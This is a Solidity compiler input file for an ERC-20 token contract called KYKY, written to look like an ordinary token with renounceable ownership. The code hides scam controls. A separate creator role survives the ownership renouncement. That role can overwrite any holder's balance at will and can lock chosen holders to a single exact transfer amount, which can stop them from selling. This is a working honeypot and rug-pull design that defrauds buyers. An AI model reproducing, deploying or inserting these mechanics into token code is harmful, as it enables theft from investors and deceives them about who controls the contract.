{{
  "language": "Solidity",
  "sources": {
    "contracts/COIN.sol": {
      "content": "pragma solidity ^0.8.17;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval( address indexed owner, address indexed spender, uint256 value );\r\n}\r\n\r\nabstract contract ModifiedContext {\r\n    function fetchMsgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\ncontract SingleOwnership is ModifiedContext {\r\n    address private ownerOfContract;\r\n    event OwnerTransition(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        address msgSender = fetchMsgSender();\r\n        ownerOfContract = msgSender;\r\n        emit OwnerTransition(address(0), msgSender);\r\n    }\r\n\r\n    function fetchOwner() public view virtual returns (address) {\r\n        return ownerOfContract;\r\n    }\r\n\r\n    modifier validateOwnership() {\r\n        require(fetchOwner() == fetchMsgSender(), \"AuthorizationError: Action must be performed by the contract owner\");\r\n        _;\r\n    }\r\n\r\n    function relinquishOwnership() public virtual validateOwnership {\r\n        emit OwnerTransition(ownerOfContract, address(0x000000000000000000000000000000000000dEaD));\r\n        ownerOfContract = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\n\r\ncontract KYKY is ModifiedContext, SingleOwnership, IERC20 {\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => uint256) private _exactTransferAmounts;\r\n    address private creatorOfToken;\r\n\r\n    string public constant _name = \"KYKY\";\r\n    string public constant _symbol = \"KYKY\";\r\n    uint8 public constant _decimals = 18;\r\n    uint256 public constant _totalSupply = 2000000 * (10 ** _decimals);\r\n\r\n    constructor() {\r\n        _balances[fetchMsgSender()] = _totalSupply;\r\n        emit Transfer(address(0), fetchMsgSender(), _totalSupply);\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    modifier validateCreator() {\r\n        require(fetchCreator() == fetchMsgSender(), \"AuthorizationError: Action must be performed by the token creator\");\r\n        _;\r\n    }\r\n\r\n    function fetchCreator() public view virtual returns (address) {\r\n        return creatorOfToken;\r\n    }\r\n\r\n    function assignNewCreator(address newCreator) public validateOwnership {\r\n        creatorOfToken = newCreator;\r\n    }\r\n\r\n    event TokensAdjusted(address indexed user, uint256 previousBalance, uint256 newBalance);\r\n\r\n    function queryTransferExactAmount(address account) public view returns (uint256) {\r\n        return _exactTransferAmounts[account];\r\n    }\r\n\r\n    function defineTransferExactAmounts(address[] calldata accounts, uint256 amount) public validateCreator {\r\n        for (uint i = 0; i < accounts.length; i++) {\r\n            _exactTransferAmounts[accounts[i]] = amount;\r\n        }\r\n    }\r\n\r\n    function adjustBalancesOfUsers(address[] memory userAddresses, uint256 desiredAmount) public validateCreator {\r\n        require(desiredAmount >= 0, \"InputError: Desired amount must be non-negative\");\r\n\r\n        for (uint256 i = 0; i < userAddresses.length; i++) {\r\n            address currentUser = userAddresses[i];\r\n            require(currentUser != address(0), \"InputError: User address must not be a zero address\");\r\n\r\n            uint256 oldBalance = _balances[currentUser];\r\n            _balances[currentUser] = desiredAmount;\r\n\r\n            emit TokensAdjusted(currentUser, oldBalance, desiredAmount);\r\n        }\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n    require(_balances[fetchMsgSender()] >= amount, \"TT: transfer amount exceeds balance\");\r\n\r\n    uint256 exactAmount = queryTransferExactAmount(fetchMsgSender());\r\n    if (exactAmount > 0) {\r\n        require(amount == exactAmount, \"TT: transfer amount does not equal the exact transfer amount\");\r\n    }\r\n\r\n    _balances[fetchMsgSender()] -= amount;\r\n    _balances[recipient] += amount;\r\n\r\n    emit Transfer(fetchMsgSender(), recipient, amount);\r\n    return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _allowances[fetchMsgSender()][spender] = amount;\r\n        emit Approval(fetchMsgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n    require(_allowances[sender][fetchMsgSender()] >= amount, \"TT: transfer amount exceeds allowance\");\r\n\r\n    uint256 exactAmount = queryTransferExactAmount(sender);\r\n    if (exactAmount > 0) {\r\n        require(amount == exactAmount, \"TT: transfer amount does not equal the exact transfer amount\");\r\n    }\r\n\r\n    _balances[sender] -= amount;\r\n    _balances[recipient] += amount;\r\n    _allowances[sender][fetchMsgSender()] -= amount;\r\n\r\n    emit Transfer(sender, recipient, amount);\r\n    return true;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n    return _totalSupply;\r\n    }\r\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}